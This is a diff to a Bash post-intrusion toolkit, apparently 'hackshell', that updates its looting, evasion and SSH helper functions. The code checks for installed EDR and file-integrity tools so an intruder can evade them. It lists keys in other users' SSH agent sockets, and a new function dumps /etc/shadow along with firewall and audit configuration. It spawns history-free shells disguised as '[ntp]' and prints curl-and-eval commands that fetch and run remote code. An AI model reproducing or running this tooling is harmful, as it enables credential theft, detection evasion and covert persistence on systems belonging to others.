@@ -182,7 +182,7 @@ xsu() {
     [ $# -le 0 ] && echo >&2 -e "May need to cut & paste: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CN}'"
     bak="$_HS_HOME_ORIG"
     unset _HS_HOME_ORIG
-    LOGNAME="${name}" USER="${name}" HOME="${h:-/tmp}" "${HS_PY:-python}" -c "import os;os.setgid(${g:?});os.setuid(${u:?});${pcmd}"
+    UID="$u" LOGNAME="${name}" USER="${name}" HOME="${h:-/tmp}" "${HS_PY:-python}" -c "import os;os.setgid(${g:?});os.setuid(${u:?});${pcmd}"
     export _HS_HOME_ORIG="$bak"
 }
 
@@ -227,13 +227,14 @@ or try all IPv4:
 }
 
 ssh-known-hosts2hashcat() {
-    command -v xxd >/dev/null || { command -v hexdump >/dev/null && xxd() { hexdump -ve '1/1 "%.2x"'; }; }
+    command -v xxd >/dev/null || { 
+        command -v hexdump >/dev/null && xxd() { hexdump -ve '1/1 "%.2x"'; }
+    }
     cat "${1:-/dev/stdin}" | _ssh-known-hosts2hashcat
     declare -F xxd >/dev/null && unset -f xxd
 }
 
-xssh() {
-    local ttyp="$(stty -g)"
+ssh() {
     local opts=()
     [ -z "$NOMX" ] && [ -n "$XHOME" ] && {
         [ ! -d "$XHOME" ] && hs_mkxhome
@@ -243,20 +244,28 @@ xssh() {
         }
     }
     # If we use key then disable Password auth ('-oPasswordAuthentication=no' is not portable)
-    { [[ "$*" == *" -i"* ]] || [[ "$*" == "-i"* ]]; } && opts+=("-oBatchMode=yes")
+    local arg
+    for arg in "$@"; do
+        [[ $arg == -i* ]] && opts+=("-oBatchMode=yes") && break
+    done
     [ -n "$HS_URL" ] && echo -e "May need to cut & paste: ' ${CDC}eval \"\$(curl -SsfL ${_HSURL})\"${CN}'"
+    command ssh "${HS_SSH_OPT[@]}" "${opts[@]}"  "$@"
+}
+
+xssh() {
+    local ttyp="$(stty -g)"
     stty raw -echo icrnl opost
-    \ssh "${HS_SSH_OPT[@]}" "${opts[@]}" -T \
-        "$@" \
-        'unset SSH_CLIENT SSH_CONNECTION; command -v script >/dev/null && c=("script" "-qc" "exec -a [uid] /bin/bash -i" "/dev/null"); [ -z "$c" ] && command -v python >/dev/null && c=("python" "-c" "import pty; pty.spawn(\"/bin/bash\")"); [ -z "$c" ] && perl -e "use Expect" 2>/dev/null && { c=("perl" "-e" "use Expect; my \$exp = Expect->new; \$exp->raw_pty(1); \$exp->spawn(\"/bin/bash\"); \$exp->interact;");echo "May need: stty sane";}; [ -z "$c" ] && c=("bash" "-i"); LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color BASH_HISTORY=/dev/null HISTFILE=/dev/null exec -a "[ntp]" "${c[@]}"'
+
+    ssh "$@" 'unset SSH_CLIENT SSH_CONNECTION; command -v script >/dev/null && c=("script" "-qc" "exec -a [uid] /bin/bash -i" "/dev/null"); [ -z "$c" ] && command -v python >/dev/null && c=("python" "-c" "import pty; pty.spawn(\"/bin/bash\")"); [ -z "$c" ] && perl -e "use Expect" 2>/dev/null && { c=("perl" "-e" "use Expect; my \$exp = Expect->new; \$exp->raw_pty(1); \$exp->spawn(\"/bin/bash\"); \$exp->interact;");echo "May need: stty sane";}; [ -z "$c" ] && c=("bash" "-i"); LESSHISTFILE=- MYSQL_HISTFILE=/dev/null TERM=xterm-256color BASH_HISTORY=/dev/null HISTFILE=/dev/null exec -a "[ntp]" "${c[@]}"'
     [ -n "$ttyp" ] && stty "${ttyp}"
 }
 
-xscp() {
+scp() {
     local opts=()
     [ -z "$NOMX" ] && [ -d "$XHOME" ] && opts=("-oControlMaster=auto" "-oControlPath=\"${XHOME}/.ssh-unix.%C\"")
-    \scp "${HS_SSH_OPT[@]}" "${opts[@]}" "$@"
+    command scp "${HS_SSH_OPT[@]}" "${opts[@]}" "$@"
 }
+xscp() { scp "$@"; }
 
 purl() {
     local opts="timeout=10"
@@ -1320,6 +1329,7 @@ _warn_edr() {
     _hs_chk_fn() { { [ -z "${1}" ] || [ ! -e "${1:?}" ]; } && return; fns+=("${1:?}"); out+="${2:?}: $1"$'\n';}
 
     _hs_chk_fn "/usr/lib/Acronis"                           "Acronis Cyber Protect"
+    _hs_chk_fn "/var/lib/afick/history"                     "AFICK (Another File Integrity Checker)"
     _hs_chk_fn "/etc/aide/aide.conf"                        "Advanced Intrusion Detection Environment (AIDE)"
     _hs_chk_fn "/etc/init.d/avast"                          "Avast"
     _hs_chk_fn "/var/lib/avast/Setup/avast.vpsupdate"       "Avast"
@@ -1394,6 +1404,12 @@ _warn_edr() {
         str="$(grep -m1 ^log_file /etc/audit/auditd.conf 2>/dev/null | sed 's|[^=]*=\s*||g')"
         [ -n "$str" ] && out+="    auditd log file: $str"$'\n'
     }
+
+    [ -f "/etc/afick.conf" ] && grep -v ^# /etc/afick.conf | grep -i "mailto" | grep -qiv "mailto\s*root@localhost" && {
+        str+="$(grep -i "mailto" /etc/afick.conf | sed 's|.*MAILTO\s*||i')"
+        [ -n "$str" ] && out+="    AFICK email alert"$'\n'"$str"$'\n'
+    }
+
     _hs_chk_systemd "avast"                             "Avast"
     _hs_chk_systemd "bdsec"                             "Bitdefender EDR / GavityZone XDR"
     _hs_chk_systemd "cylancesvc"                        "Blackberry cyPROTECT"
@@ -1881,22 +1897,46 @@ _hs_gen_home() {
     set +f
 }
 
+ebpf_show() {
+    if command -v perl >/dev/null; then
+        perl -e 'for my $fd (glob "/proc/*/fd/*") {
+            next unless -l $fd && readlink($fd) =~ /bpf/;
+            (my $pid = $fd) =~ s|/proc/(\d+)/.*|$1|;
+            next if $pid == 1 || $seen{$pid}++;
+            open my $f, "<", "/proc/$pid/cmdline" or next;
+            my $cmd = do { local $/; <$f> };
+            $cmd =~ s/\0/ /g;
+            print "$pid $cmd\n";
+            }'
+    else
+        find /proc -maxdepth 3 -path '*/fd/*' -lname '*bpf*' 2>/dev/null | awk -F'/' '$3!=1 && !seen[$3]++{cmd="tr \"\\0\" \" \" < /proc/"$3"/cmdline 2>/dev/null"; cmd|getline cmdline; close(cmd); if(cmdline) print $3, cmdline}'
+    fi
+
+    find /sys/fs/bpf/ -type f
+}
+
 lootlight() {
-    local str pid
-    ls -al "${ROOTFS}"/tmp/ssh-* &>/dev/null && {
-        echo -e "${CB}SSH_AUTH_SOCK${CDY}${CF}"
-        find "${ROOTFS}"/tmp -name 'agent.*' 2>/dev/null | while read -r fn; do
-            unset str
-            command -v lsof >/dev/null && {
-                pid=$(lsof -ntw "$fn" 2>/dev/null) && {
-                    str=$(realpath /proc/${pid}/exe 2>/dev/null) && str="[ACTIVE: $pid:$str]"
-                }
-            }
-            echo "$(ls -al "$fn")"$'\t'"${str}"
-            str=$(SSH_AUTH_SOCK="$fn" ssh-add -l 2>/dev/null) && [ -n "$str" ] && echo -e "    ${CDY}Keys:${CF} $str"
-        done
-        echo -en "${CN}"
-    }
+    local str s res pid header
+    find /tmp/ssh-* -type s -name 'agent.*' 2>/dev/null | while read -r fn; do
+        unset str res s
+        command -v lsof >/dev/null && pid=$(lsof -ntw "$fn" 2>/dev/null) && {
+            # lsof may fail as non-root
+            s=$(realpath /proc/${pid}/exe 2>/dev/null) && s=$'\t'"[ACTIVE: $pid:$str]"
+        }
+        str=$(SSH_AUTH_SOCK="$fn" ssh-add -l 2>/dev/null) && [ -n "$str" ] && {
+            res+="$(ls -l "$fn")${s}"$'\n'
+            res+=$'\e[0;33m    Keys:'$'\e[2m\n'
+            while IFS= read -r line; do
+                res+="    $line"$'\n'
+            done <<< "$str"
+        }
+        [ -z "$res" ] && continue
+        [ -z "$header" ] && {
+            echo -e "${CB}SSH_AUTH_SOCK${CDY}${CF}"
+            header=1
+        }
+        echo -n "$res"$'\033[0m'
+    done
 
     [ "$UID" -ne 0 ] && {
         unset str
@@ -2044,6 +2084,49 @@ _loot_auth_log() {
     echo -en "${CN}"
 }
 
+lootmoremore() {
+    # Stolen from whatserver.sh:
+    set -x
+    date
+    uname -a
+    uptime
+    command -v xid >/dev/null && xid
+    hostname
+    systemctl list-unit-files --all --no-pager
+    systemctl list-units --type=service --all --no-pager
+    systemctl list-units --type=timer --all --no-pager
+    systemctl list-timers --all --no-pager
+    lsmod
+    cat /proc/cmdline
+    cat /proc/config
+    [ -f /proc/config.gz ] && gunzip < /proc/config.gz || cat /boot/config-$(uname -r)
+    cat /etc/resolv.conf
+    cat /etc/hosts
+    cat /etc/passwd
+    cat /etc/shadow
+    cat /etc/group
+    ip a sh
+    ip r show
+    ip rule show
+    command wg >/dev/null && wg show 2>/dev/null
+    ps -eF f
+    ss -lanutop4
+    ss -lanutop6
+    iptables-save
+    nft -ann list ruleset
+    sysctl -a
+    last -iwx
+    lastb -iwx
+    command -v auditctl >/dev/null && auditctl -l
+    # afick -k
+    cat /etc/afick.conf 2>/dev/null
+    cat /var/lib/afick/history 2>/dev/null
+    cat /etc/nsswitch.conf 2>/dev/null
+    cat /etc/nscd.conf 2>/dev/null
+    cat /etc/nslcd.conf 2>/dev/null
+    set +x
+}
+
 lootmore() {
     local hn fn str arr mc_hst
 
@@ -2065,7 +2148,7 @@ lootmore() {
         # : 1762985354:0;GS_HOST= gs-netcat
 
         [ ${#fn[@]} -eq 0 ] && continue
-        str="$(grep -hE '([ ;]{1}|^)(ssh|scp|sftp|sshfs|rsync|git|rclone|gs-netcat) ' "${fn[@]}" 2>/dev/null | nocol | anew)"
+        str="$(grep -ahE '([ ;]{1}|^)(ssh|scp|sftp|sshfs|rsync|git|rclone|gs-netcat) ' "${fn[@]}" 2>/dev/null | nocol | anew)"
 
         [ -z "$str" ] && continue
         echo -e "${CB}Interesting commands ${CDY}${hn}/.[bash|zsh]_history${CF}"
@@ -2562,17 +2645,17 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
 
     HS_SSH_OPT=()
     command -v ssh >/dev/null && {
-        str="$(\ssh -V 2>&1)"
+        str="$(command ssh -V 2>&1)"
         [[ "$str" == OpenSSH_[67]* ]] && a="no"
         HS_SSH_OPT+=("-oStrictHostKeyChecking=${a:-accept-new}")
         # HS_SSH_OPT+=("-oUpdateHostKeys=no")
         HS_SSH_OPT+=("-oUserKnownHostsFile=/dev/null")
         # Even if 'ssh -Q' shows the key it sometimes complains that it cant use them.
         # User can set SSH_NO_OLD before hs to disable old ciphers.
-        [ -z "$SSH_NO_OLD" ] && \ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -V 2>/dev/null && HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
-        [ -z "$SSH_NO_OLD" ] && \ssh -oHostKeyAlgorithms=+ssh-dss -V 2>/dev/null && HS_SSH_OPT+=("-oHostKeyAlgorithms=+ssh-dss")
-        [ -z "$SSH_NO_OLD" ] && \ssh -oCiphers=+aes128-cbc -V 2>/dev/null && HS_SSH_OPT+=("-oCiphers=+aes128-cbc")
-        [ -z "$SSH_NO_OLD" ] && \ssh -oCiphers=+3des-cbc -V 2>/dev/null && HS_SSH_OPT+=("-oCiphers=+3des-cbc")
+        [ -z "$SSH_NO_OLD" ] && command ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -V 2>/dev/null && HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
+        [ -z "$SSH_NO_OLD" ] && command ssh -oHostKeyAlgorithms=+ssh-dss -V 2>/dev/null && HS_SSH_OPT+=("-oHostKeyAlgorithms=+ssh-dss")
+        [ -z "$SSH_NO_OLD" ] && command ssh -oCiphers=+aes128-cbc -V 2>/dev/null && HS_SSH_OPT+=("-oCiphers=+aes128-cbc")
+        [ -z "$SSH_NO_OLD" ] && command ssh -oCiphers=+3des-cbc -V 2>/dev/null && HS_SSH_OPT+=("-oCiphers=+3des-cbc")
 
         HS_SSH_OPT+=("-oConnectTimeout=5")
         HS_SSH_OPT+=("-oServerAliveInterval=30")
@@ -2673,9 +2756,11 @@ hs_init_alias_reinit() {
 
 hs_init_alias() {
     :
-    alias ssh="ssh ${HS_SSH_OPT[*]}"
-    alias scp="scp ${HS_SSH_OPT[*]}"
-    \vi --help 2>&1 | grep -Fqm1 -- -i && alias vi="vi -i NONE"
+    # alias ssh="ssh ${HS_SSH_OPT[*]}"
+    # alias scp="scp ${HS_SSH_OPT[*]}"
+    unalias ssh 2>/dev/null
+    command vi --help 2>&1 | grep -Fqm1 -- -i && alias vi="vi -i NONE"
+    command vim && alias vi="vim -i NONE"
     alias vim="vim -i NONE"
     alias screen="screen -ln"
 
@@ -2686,6 +2771,7 @@ hs_init_alias() {
     alias lsg='ls -Alh --color=always | grep -i -E'
     alias cd..='cd ..'
     alias ..='cd ..'
+    alias ...='cd ../..'
 
     hs_init_alias_reinit
 }
@@ -2892,7 +2978,9 @@ hs_info
 
 # unset all functions that are no longer needed.
 unset -f hs_init hs_init_alias hs_init_dl hs_init_shell
-unset SSH_CONNECTION SSH_CLIENT _HSURLORIGIN
+# Keep these but do not leak them to child processes.
+unset -n SSH_CONNECTION SSH_CLIENT
+unset _HSURLORIGIN
 
 # Exit with TRUE in case parent shell ues 'set -e':
 :
